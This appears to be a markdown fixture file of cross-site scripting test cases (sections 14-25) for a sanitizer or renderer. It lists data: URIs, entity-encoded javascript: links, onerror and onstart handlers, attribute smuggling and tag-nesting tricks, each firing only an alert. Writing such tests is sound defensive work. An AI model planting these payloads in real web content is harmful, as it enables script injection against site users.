# batch1 (sections 14-25)

## 14. data: URI
<img src="data:text/html,<script>alert(14)</script>">
<a href="data:text/html,<script>alert(15)</script>">data-href</a>


## 15. encoded javascript
<a href="&#106;avascript:alert(16)">encoded-js</a>
<a href="java&#x73;cript:alert(17)">hex-js</a>


## 16. markdown link with js URL
[link](javascript:alert(18))
[link](java%73cript:alert(19))


## 17. xmp / noembed / template / plaintext
<xmp><script>alert(20)</script></xmp>
<noembed><script>alert(21)</script></noembed>
<template><script>alert(22)</script></template>
<plaintext><script>alert(23)</script></plaintext>


## 18. autolink / protocol relative
<img src="//evil.example/x.png" onerror="alert(24)">


## 19. markdown image with js in alt
![x](x.png "title onerror=alert(25)")


## 20. katex / mathjax injection
$`onerror=alert(26)`$


## 21. custom attribute smuggling
<div data-x="&quot; onmouseover=&quot;alert(27)">y</div>


## 22. nested markdown in html
<div>
**bold** <img src=x onerror=alert(28)>
</div>


## 23. br with js via entity munging
<img src=x onerror=&#x61;lert(29)>


## 24. input type=image src
<input type="image" src="x" onerror="alert(30)">


## 25. marquee / blink
<marquee onstart="alert(31)">x</marquee>

